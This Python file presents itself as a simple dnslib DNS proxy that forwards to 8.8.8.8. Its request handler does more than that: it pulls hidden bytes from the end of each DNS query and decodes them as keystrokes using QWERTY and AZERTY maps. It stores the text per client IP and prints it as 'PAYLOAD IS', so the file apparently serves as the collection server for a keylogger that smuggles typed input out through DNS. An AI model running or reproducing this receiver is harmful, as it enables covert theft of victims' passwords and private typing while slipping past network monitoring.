import yaml
import json
import socket

from dnslib import DNSRecord,RCODE,QTYPE
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger


LOCAL_HOST = '0.0.0.0'      # Listen on all available interfaces
LOCAL_PORT = 53           # Port for the UDP proxy to listen on
REMOTE_HOST = '8.8.8.8'  # Replace with the remote server's IP
REMOTE_PORT = 53              # Port of the remote server
qw_key_map =yaml.safe_load(open("qwerty.yml"))
az_key_map =yaml.safe_load(open("azerty.yml"))
key_maps={0:qw_key_map,1:az_key_map}
keys = {}

class ProxyResolver(BaseResolver):
    def __init__(self,address,port,timeout=0,strip_aaaa=False):
        self.address = address
        self.port = port
        self.timeout = timeout
        self.strip_aaaa = strip_aaaa

    def resolve(self,request,handler):
        try:
            if self.strip_aaaa and request.q.qtype == QTYPE.AAAA:
                reply = request.reply()
                reply.header.rcode = RCODE.NXDOMAIN
            else:
                if handler.protocol == 'udp':
                    proxy_r = request.send(self.address,self.port,
                                    timeout=self.timeout)
                else:
                    proxy_r = request.send(self.address,self.port,
                                    tcp=True,timeout=self.timeout)
                reply = DNSRecord.parse(proxy_r)
        except socket.timeout:
            reply = request.reply()
            reply.header.rcode = getattr(RCODE,'NXDOMAIN')

        return reply

class PassthroughDNSHandler(DNSHandler):

    def get_reply(self,data):
        host,port = self.server.resolver.address,self.server.resolver.port
        client_ip = str(self.client_address[0])
        if not keys.get(client_ip):
            keys[client_ip]=[]

        try:
            payload  = data[-8:]
            key_events  = zip(payload[::2],payload[1::2])
            for (layout,code) in key_events:
                if key_map := key_maps.get(layout):
                    keys[client_ip].append(key_map.get(code,''))
            
            res={}
            for client_ip,k in keys.items():
                res[client_ip] = "".join(k)
                print(f"\rPAYLOAD IS:\n{json.dumps(res,indent=2,ensure_ascii=False)}", end="")
       
        except:
            pass
       
        data = bytearray(data[:-8])
        data[2:4] = bytes.fromhex("0120")

        request = DNSRecord.parse(bytes(data))
        self.server.logger.log_request(self,request)
        response = send_udp(data,host,port)
        reply = DNSRecord.parse(response)
        self.server.logger.log_reply(self,reply)
        return response



def send_udp(data,host,port):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.sendto(data,(host,port))
        response,server = sock.recvfrom(8192)
        return response
    finally:
        if (sock is not None):
            sock.close()

if __name__ == '__main__':

    import argparse,time

    p = argparse.ArgumentParser(description="DNS Proxy")
    p.add_argument("--port","-p",type=int,default=53,
                    metavar="<port>",
                    help="Local proxy port (default:53)")
    p.add_argument("--address","-a",default="",
                    metavar="<address>",
                    help="Local proxy listen address (default:all)")
    p.add_argument("--upstream","-u",default="8.8.8.8:53",
            metavar="<dns server:port>",
                    help="Upstream DNS server:port (default:8.8.8.8:53)")
    p.add_argument("--tcp",action='store_true',default=False,
                    help="TCP proxy (default: UDP only)")
    p.add_argument("--timeout","-o",type=float,default=5,
                    metavar="<timeout>",
                    help="Upstream timeout (default: 5s)")
    p.add_argument("--strip-aaaa",action='store_true',default=False,
                    help="Retuen NXDOMAIN for AAAA queries (default: off)")
    p.add_argument("--passthrough",action='store_true',default=False,
                    help="Dont decode/re-encode request/response (default: off)")
    p.add_argument("--log",default="request,reply,truncated,error",
                    help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
    p.add_argument("--log-prefix",action='store_true',default=False,
                    help="Log prefix (timestamp/handler/resolver) (default: False)")
    args = p.parse_args()

    args.dns,_,args.dns_port = args.upstream.partition(':')
    args.dns_port = int(args.dns_port or 53)

    print("Starting Proxy Resolver (%s:%d -> %s:%d) [%s]" % (
                        args.address or "*",args.port,
                        args.dns,args.dns_port,
                        "UDP/TCP" if args.tcp else "UDP"))

    
    udp_server = DNSServer( ProxyResolver(args.dns,args.dns_port,args.timeout,args.strip_aaaa),
                           port=args.port,
                           address=args.address,
                           logger=DNSLogger(args.log,prefix=args.log_prefix),
                           handler=PassthroughDNSHandler)
    udp_server.start()


    while udp_server.isAlive():
        time.sleep(1)
